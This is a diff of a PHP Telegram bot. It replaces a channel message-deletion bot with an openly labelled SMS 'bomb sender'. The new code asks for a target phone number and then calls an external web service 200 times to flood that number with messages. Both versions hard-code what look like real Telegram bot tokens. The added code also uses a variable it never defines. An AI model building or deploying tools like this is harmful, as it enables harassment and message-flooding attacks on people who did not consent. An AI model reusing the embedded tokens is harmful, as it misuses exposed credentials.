@@ -1,77 +1,83 @@
 <?php
-# -- Developer : Pouria Hosseini | Channel : @iRoSource | Pv : @MrCodi -- #
-error_reporting(0);
-set_time_limit(0);
-$API_KEY = '1428201227:AAGxzJ4h4axTXrHQj_v886GvtDIGqYgn9tc'; # -- Token -- #
-define('API_KEY', $API_KEY);
-function bot($method, $datas = []){
-    $url = "https://api.telegram.org/bot" . API_KEY . "/" . $method;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
-    $res = curl_exec($ch);
-    if (curl_error($ch)) {
-        var_dump(curl_error($ch));
-    } else {
-        return json_decode($res);
-}}
-$update = json_decode(file_get_contents('php://input'));
-$text = $update->message->text;
-$chat_id = $update->message->chat->id;
+# -- Developer : Pouria Hosseini | Channel : @iRoSource | Pv : @NullDeveloper -- #
+define('API_KEY','1508546932:AAH6RZvMeWQxqxlOUh-lwfKJUM221asRR3Y'); # -- Token -- #
+$WebService = "iRoSource.com/Api/api.php"; # -- Api Domain -- #
+# -- Variables -- #
+$get = json_decode(file_get_contents('php://input'));
+$txt_msg = $get->message->text;
+$user_id = $get->message->from->id;
+$msg_id = $get->message->message_id;
+mkdir("data/$chat_id");
 # -----
-if(!file_exists("data")){mkdir("data");}
-if($text == '/start'){
-	bot('sendMessage',[
-	'chat_id' => $chat_id,
-	'text' => "سلام\nبرای پاک کردن پیام های کانال خود ربات را در کانال ادمین کرده و اخرین پیام کانال را اینجا فروارد کنید"
-	]);
+$fox = file_get_contents("data/$user_id/sms.txt");
+$fox200 = file_get_contents("data/$user_id/sms200.txt");
+# -----
+function MrCodi($method,$datas=[]){$url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+    $res = curl_exec($ch);
+    if(curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        return json_decode($res);
+    }
 }
-elseif($update->message->forward_from_chat){
-	$channel = $update->message->forward_from_chat->username;
-	$message_id = $update->message->forward_from_message_id;
-	$botid = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getme'))->result->id;
-	$truechannel = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY."/getChatMember?chat_id=@$channel&user_id=".$botid))->result->status;
-	if($truechannel == 'administrator'){
-		file_put_contents("data/$chat_id.txt","count|$channel|$message_id");
-		bot('sendMessage',[
-		'chat_id' => $chat_id,
-		'text' => "تعداد پیام هایی که میخاهید پاک کنید ارسال کنید\nتعداد باید بین 1 تا 100 باشد"
-		]);
-	}else{
-		bot('sendMessage',[
-		'chat_id' => $chat_id,
-		'text' => "ابتدا ربات را ادمین کانال کنید"
-		]);
-	}
+# -- Function -- #
+function sendmsg($user_id,$txt_msg,$msg_id,$key = null) {MrCodi('sendmessage', ['chat_id'=>$user_id, 'text'=>$txt_msg, 'reply_to_message_id'=>$msg_id,'reply_markup'=>$key,]);
 }
-elseif(strpos(file_get_contents("data/$chat_id.txt"),"count|") !== false){
-	if($text >= 1 and $text <= 100){
-		$get = explode("|",file_get_contents("data/$chat_id.txt"));
-		$channel = $get[1];
-		$message_id = $get[2];
-		unlink("data/$chat_id.txt");
-		bot('sendMessage',[
-		'chat_id' => $chat_id,
-		'text' => "لطفا کمی صبر کنید"
-		]);
-		$next = $message_id - $text;
-		for($x = $message_id; $x >= $next; $x--){
-		    bot('deleteMessage',[
-			'chat_id' => "@$channel",
-			'message_id' => $x
-			]);
-			if($x < 1 ){ break; }
-		}
-		bot('sendMessage',[
-		'chat_id' => $chat_id,
-		'text' => "پاک سازی پیام های به اتمام رسید"
-		]);
-	}else{
-		bot('sendMessage',[
-		'chat_id' => $chat_id,
-		'text' => "تعداد پیام هایی که میخاهید پاک کنید ارسال کنید\nتعداد باید بین 1 تا 100 باشد"
-		]);
+# -----
+$menu = json_encode([
+'keyboard'=>[
+[['text'=>'ارسال پیامک 🧾']],
+[['text'=>'راهنما 📚'],['text'=>'پشتیبانی ☎️']],
+],"resize_keyboard"=>true]);
+# -----
+$MrCodi = json_encode([
+'keyboard'=>[
+[['text'=>'🏛']],
+],"resize_keyboard"=>true]);
+mkdir("data");
+mkdir("data/$user_id");
+# -- Start -- #
+if($txt_msg == "/start" or $txt_msg == "🏛") {
+file_put_contents("data/$user_id/sms.txt","none");
+		$user = file_get_contents('Member.txt');
+	$members = explode("\n",$user);
+	if(!in_array($chat_id,$members)){
+		$add_user = file_get_contents('Member.txt');
+		$add_user .= $chat_id."\n";
+		file_put_contents('Member.txt',$add_user);
 	}
+sendmsg($user_id,"سلام به ربات بمب سِندر خوش اومدید !🎉",$msg_id,$menu);
+}
+# -----
+if($txt_msg=="ارسال پیامک 🧾") {
+file_put_contents("data/$user_id/sms200.txt","attack");
+sendmsg($user_id,"شماره کاربر مورد نظر رو وارد کنید !🎯",$msg_id,$MrCodi);
+}
+elseif($fox200 == "attack"&&$txt_msg!="🏛") {
+if(is_numeric($txt_msg)) {
+file_put_contents("data/$user_id/sms200.txt","none");
+sendmsg($user_id,"تایید شد !",$msg_id);
+for($i=1; $i <= 200; $i++) {
+file_get_contents("$WebService?num=$txt_msg");
+}
+sendmsg($user_id,"با موفقیت ارسال شد .✅",$msg_id);}
+ else {
+sendmsg($user_id,"شماره صحیح نیست .✖️",$msg_id);}
+}
+# -----
+if($txt_msg=="راهنما 📚") {
+sendmsg($user_id,"راهنما 📚 :
+1 : وارد بخش ' ارسال پیامک ' میشید.
+2 : شماره کاربر مورد نظر رو به درستی وارد میکنید و صبر میکنید که ربات تایید رو ارسال کند.
+- - - -
+قوانین 🧾 :
+1 : هرگونه سو استفاده بر عهده کاربر میباشد.
+2 : هرگونه کپی برداری از ربات پیگرد قانونی دارد.",$msg_id,$MrCodi);
+}
+# -----
+if($txt_msg=="پشتیبانی ☎️") {
+sendmsg($user_id,"📬جهت برقراری با پشتیبانی میتوانید به آیدی ادمین ربات مرجعه کنید👇 :
+
+👤Admin : @amir_prs6",$msg_id,$MrCodi);
 }
 ?>
